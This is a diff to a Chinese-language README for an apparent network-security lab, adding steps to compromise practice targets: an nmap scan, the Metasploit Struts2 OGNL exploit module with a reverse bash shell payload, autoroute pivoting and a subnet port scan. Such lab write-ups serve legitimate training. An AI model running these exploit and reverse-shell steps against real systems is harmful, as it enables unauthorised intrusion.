@@ -265,11 +265,9 @@ docker run --rm --net=container:${container_name} -v ${PWD}/tcpdump/${container_
 
 ![](.assets_img/README/tmux_container_tcpdump.png)
 
-### 攻破靶标 1
+### Metasploit 连接 PostgreSQL 问题
 
 ![](.assets_img/README/db_init.png)
-
-#### Metasploit 连接 PostgreSQL 问题
 
 在 `msfdb init` 后，`msfconsole` 无法连接 `PostgreSQL` 数据库，删除 `msf` 数据库（`msfdb delete`）后重新初始化依然报错
 
@@ -327,6 +325,69 @@ msfconsole  # 进入 Metasploit
 回想起自己当前使用的虚拟机是一路从 `kali-linux-2023.3-virtualbox-amd64` `滚动更新` 到现在 `2024.2`，一年时间！
 
 ~~滚动更新一时爽，版本冲突火葬场~~
+
+### 拓扑图
+
+![](.assets_img/README/new_dmz_topology_ips.png)
+
+### 攻破靶标 1
+
+信息收集——>`nmap` 端口扫描并尝试识别服务：
+
+```bash
+db_nmap -p 12862 192.168.56.175 -n -A
+```
+
+使用 `Metasploit` 的 `exploit/multi/http/struts2_multi_eval_ognl` 模块：
+
+```bash
+use exploit/multi/http/struts2_multi_eval_ognl
+set payload payload/cmd/unix/reverse_bash  # 设置 payload 为 bash 反弹 shell
+```
+
+`options` 配置如下：
+
+![](.assets_img/README/strusts2_payload.png)
+
+成功获取 `shell` 后，查看 `flag`：
+
+![](.assets_img/README/struct2_shell.png)
+
+#### autoroute
+
+如果直接使用老师示例中的命令 `run autoroute -s 192.170.84.0/24` 会显示 `OptionValidateError The following options failed to validate`：
+
+![](.assets_img/README/auto_route_error.png)
+
+以下方法验证有效：
+
+```bash
+use multi/manage/autoroute
+```
+
+`options` 配置如下：
+
+![](.assets_img/README/autoroute_options.png)
+
+检查路由表：
+
+![](.assets_img/README/check_autoroute.png)
+
+### 攻破靶标 2 & 3 & 4
+
+#### 探测服务
+
+```bash
+use scanner/portscan/tcp
+```
+
+详细配置如下：
+
+![](.assets_img/README/scanner_options.png)
+
+发现服务：
+
+![](.assets_img/README/subnet_84_services.png)
 
 <!-- ## Debug
 
